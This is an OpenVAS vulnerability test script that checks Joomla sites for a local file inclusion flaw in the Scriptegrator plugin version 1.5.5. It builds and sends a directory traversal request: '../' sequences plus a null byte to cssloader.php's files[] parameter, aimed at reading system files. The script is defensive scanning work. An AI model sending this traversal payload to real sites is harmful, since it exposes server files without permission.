###############################################################################
# OpenVAS Vulnerability Test
#
# Joomla! Scriptegrator plugin Multiple Local File Inclusion Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802026");
  script_version("2022-02-17T14:14:34+0000");
  script_tag(name:"last_modification", value:"2022-02-17 14:14:34 +0000 (Thu, 17 Feb 2022)");
  script_tag(name:"creation_date", value:"2011-06-17 11:16:31 +0200 (Fri, 17 Jun 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Joomla! Scriptegrator plugin Multiple Local File Inclusion Vulnerabilities");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17394");
  script_xref(name:"URL", value:"http://www.greatjoomla.com/extensions/plugins/core-design-scriptegrator-plugin.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform directory
traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"Joomla! Scriptegrator plugin Version 1.5.5, Other versions may also be
affected.");

  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied input via the
multiple parameter to multiple files, which allows attackers to read arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"Upgrade to Joomla! Scriptegrator plugin Version 2.0.9 or later.");

  script_tag(name:"summary", value:"Joomla! with Scriptegrator plugin is prone to multiple local file inclusion vulnerabilities.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/plugins/system/cdscriptegrator/libraries/highslide/css/cssloader.php?files[]=" +
        crap(data:"../", length:3*15) + files[file] + "%00.css";

  if (http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port:port, data: report);
    exit(0);
  }
}

exit(99);
